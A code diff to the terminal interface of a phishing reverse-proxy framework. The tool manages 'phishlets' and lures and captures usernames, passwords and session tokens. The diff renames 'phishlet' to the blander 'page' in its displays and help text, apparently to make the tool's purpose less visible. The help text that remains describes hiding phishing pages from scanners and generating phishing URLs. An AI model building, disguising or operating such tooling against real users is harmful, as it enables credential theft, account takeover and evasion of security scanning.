@@ -329,7 +329,7 @@ func (t *Terminal) handleSessions(args []string) error {
 
 	pn := len(args)
 	if pn == 0 {
-		cols := []string{"id", "phishlet", "username", "password", "tokens", "remote ip", "time"}
+		cols := []string{"id", "page", "username", "password", "tokens", "remote ip", "time"}
 		sessions, err := t.db.ListSessions()
 		if err != nil {
 			return err
@@ -377,7 +377,7 @@ func (t *Terminal) handleSessions(args []string) error {
 					tcol = lgreen.Sprintf("captured")
 				}
 
-				keys := []string{"id", "phishlet", "username", "password", "tokens", "landing url", "user-agent", "remote ip", "create time", "update time"}
+				keys := []string{"id", "page", "username", "password", "tokens", "landing url", "user-agent", "remote ip", "create time", "update time"}
 				vals := []string{strconv.Itoa(s.Id), lred.Sprint(s.Phishlet), lblue.Sprint(s.Username), lblue.Sprint(s.Password), tcol, yellow.Sprint(s.LandingURL), dgray.Sprint(s.UserAgent), yellow.Sprint(s.RemoteAddr), dgray.Sprint(time.Unix(s.CreateTime, 0).Format("2006-01-02 15:04")), dgray.Sprint(time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04"))}
 				log.Printf("\n%s", AsRows(keys, vals))
 
@@ -486,7 +486,7 @@ func (t *Terminal) handlePhishlets(args []string) error {
 			}
 			domain, _ := t.cfg.GetSiteDomain(args[1])
 			if domain == "" {
-				return fmt.Errorf("you need to set hostname for phishlet '%s', first. type: phishlet hostname %s your.hostame.domain.com", args[1], args[1])
+				return fmt.Errorf("you need to set hostname for page '%s', first. type: page hostname %s your.hostame.domain.com", args[1], args[1])
 			}
 			err = t.cfg.SetSiteEnabled(args[1])
 			if err != nil {
@@ -521,7 +521,7 @@ func (t *Terminal) handlePhishlets(args []string) error {
 			}
 			bhost, ok := t.cfg.GetSiteDomain(pl.Site)
 			if !ok || len(bhost) == 0 {
-				return fmt.Errorf("no hostname set for phishlet '%s'", pl.Name)
+				return fmt.Errorf("no hostname set for page '%s'", pl.Name)
 			}
 			out := ""
 			hosts := pl.GetPhishHosts()
@@ -552,7 +552,7 @@ func (t *Terminal) handlePhishlets(args []string) error {
 			}
 			bhost, ok := t.cfg.GetSiteDomain(pl.Site)
 			if !ok || len(bhost) == 0 {
-				return fmt.Errorf("no hostname set for phishlet '%s'", pl.Name)
+				return fmt.Errorf("no hostname set for page '%s'", pl.Name)
 			}
 			urls, err := pl.GetLandingUrls(args[2], true)
 			if err != nil {
@@ -626,7 +626,7 @@ func (t *Terminal) handleLures(args []string) error {
 				}
 				bhost, ok := t.cfg.GetSiteDomain(pl.Site)
 				if !ok || len(bhost) == 0 {
-					return fmt.Errorf("no hostname set for phishlet '%s'", pl.Name)
+					return fmt.Errorf("no hostname set for page '%s'", pl.Name)
 				}
 
 				var base_url string
@@ -949,7 +949,7 @@ func (t *Terminal) handleLures(args []string) error {
 				return err
 			}
 
-			keys := []string{"phishlet", "hostname", "path", "template", "ua_filter", "redirect_url", "info", "og_title", "og_desc", "og_image", "og_url"}
+			keys := []string{"page", "hostname", "path", "template", "ua_filter", "redirect_url", "info", "og_title", "og_desc", "og_image", "og_url"}
 			vals := []string{hiblue.Sprint(l.Phishlet), cyan.Sprint(l.Hostname), hcyan.Sprint(l.Path), white.Sprint(l.Template), green.Sprint(l.UserAgentFilter), yellow.Sprint(l.RedirectUrl), l.Info, dgray.Sprint(l.OgTitle), dgray.Sprint(l.OgDescription), dgray.Sprint(l.OgImageUrl), dgray.Sprint(l.OgUrl)}
 			log.Printf("\n%s\n", AsRows(keys, vals))
 
@@ -983,14 +983,14 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("proxy", []string{"username"}, "username <username>", "set proxy authentication username")
 	h.AddSubCommand("proxy", []string{"password"}, "password <password>", "set proxy authentication password")
 
-	h.AddCommand("phishlets", "general", "manage phishlets configuration", "Shows status of all available phishlets and allows to change their parameters and enabled status.", LAYER_TOP,
-		readline.PcItem("phishlets", readline.PcItem("hostname", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("enable", readline.PcItemDynamic(t.phishletPrefixCompleter)),
+	h.AddCommand("pages", "general", "manage pages configuration", "Shows status of all available pages and allows to change their parameters and enabled status.", LAYER_TOP,
+		readline.PcItem("pages", readline.PcItem("hostname", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("enable", readline.PcItemDynamic(t.phishletPrefixCompleter)),
 			readline.PcItem("disable", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("hide", readline.PcItemDynamic(t.phishletPrefixCompleter)),
 			readline.PcItem("unhide", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-url", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-hosts", readline.PcItemDynamic(t.phishletPrefixCompleter))))
-	h.AddSubCommand("phishlets", nil, "", "show status of all available phishlets")
-	h.AddSubCommand("phishlets", []string{"hostname"}, "hostname <phishlet> <hostname>", "set hostname for given phishlet (e.g. this.is.not.a.phishing.site.evilsite.com)")
-	h.AddSubCommand("phishlets", []string{"enable"}, "enable <phishlet>", "enables phishlet and requests ssl/tls certificate if needed")
-	h.AddSubCommand("phishlets", []string{"disable"}, "disable <phishlet>", "disables phishlet")
+	h.AddSubCommand("phishlets", nil, "", "show status of all available pages")
+	h.AddSubCommand("phishlets", []string{"hostname"}, "hostname <phishlet> <hostname>", "set hostname for given page (e.g. this.is.not.a.phishing.site.evilsite.com)")
+	h.AddSubCommand("phishlets", []string{"enable"}, "enable <phishlet>", "enables page and requests ssl/tls certificate if needed")
+	h.AddSubCommand("phishlets", []string{"disable"}, "disable <phishlet>", "disables page")
 	h.AddSubCommand("phishlets", []string{"hide"}, "hide <phishlet>", "hides the phishing page, logging and redirecting all requests to it (good for avoiding scanners when sending out phishing links)")
 	h.AddSubCommand("phishlets", []string{"unhide"}, "unhide <phishlet>", "makes the phishing page available and reachable from the outside")
 	h.AddSubCommand("phishlets", []string{"get-url"}, "get-url <phishlet> <redirect_url>", "generates phishing url with redirection on successful authentication")
@@ -1155,7 +1155,7 @@ func (t *Terminal) sprintPhishletStatus(site string) string {
 	yellow := color.New(color.FgYellow)
 	hiwhite := color.New(color.FgHiWhite)
 	n := 0
-	cols := []string{"phishlet", "author", "active", "status", "hostname"}
+	cols := []string{"pages", "author", "active", "status", "hostname"}
 	var rows [][]string
 	for s, _ := range t.cfg.phishlets {
 		if site == "" || s == site {
@@ -1191,7 +1191,7 @@ func (t *Terminal) sprintLures() string {
 	hcyan := color.New(color.FgHiCyan)
 	white := color.New(color.FgHiWhite)
 	//n := 0
-	cols := []string{"id", "phishlet", "hostname", "path", "template", "ua_filter", "redirect_url", "og"}
+	cols := []string{"id", "pages", "hostname", "path", "template", "ua_filter", "redirect_url", "og"}
 	var rows [][]string
 	for n, l := range t.cfg.lures {
 		var og string
